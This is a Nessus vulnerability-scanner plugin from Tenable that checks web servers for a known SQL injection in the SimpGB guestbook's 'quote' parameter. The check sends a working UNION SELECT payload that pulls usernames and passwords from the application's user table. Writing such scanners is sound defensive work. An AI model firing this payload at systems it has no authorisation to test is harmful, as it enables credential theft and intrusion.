#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(17328);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-0786");
  script_bugtraq_id(12801);
  script_osvdb_id(14773);

  script_name(english:"SimpGB guestbook.php quote Parameter SQL Injection");
  script_summary(english:"Checks for SQL injection in SimpGB");
 
  script_set_attribute(  attribute:"synopsis",  value:
"The remote web server contains a PHP application that is vulnerable to
a SQL injection attack."  );
  script_set_attribute(  attribute:"description",   value:
"The remote host is running SimpGB, a web-based guestbook application
written in PHP.

The version of SimpGB installed on the remote host fails to sanitize
user input to the 'quote' parameter of the 'guestbook.php' script
before using it in SQL queries.  An unauthenticated, remote attacker
can leverage this issue to manipulate database queries to read or
write confidential data as well as potentially execute arbitrary
commands on the remote web server."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://seclists.org/bugtraq/2005/Mar/243"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/03/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/03/13");
 script_cvs_date("$Date: 2016/11/17 15:28:26 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();
 
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_family(english:"CGI abuses");

  script_dependencie("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/simpgb", "/gb", "/guestbook", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  if (egrep(string:res[2], pattern:"Am 0000-00-00 00:00:00 schrieb "))
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
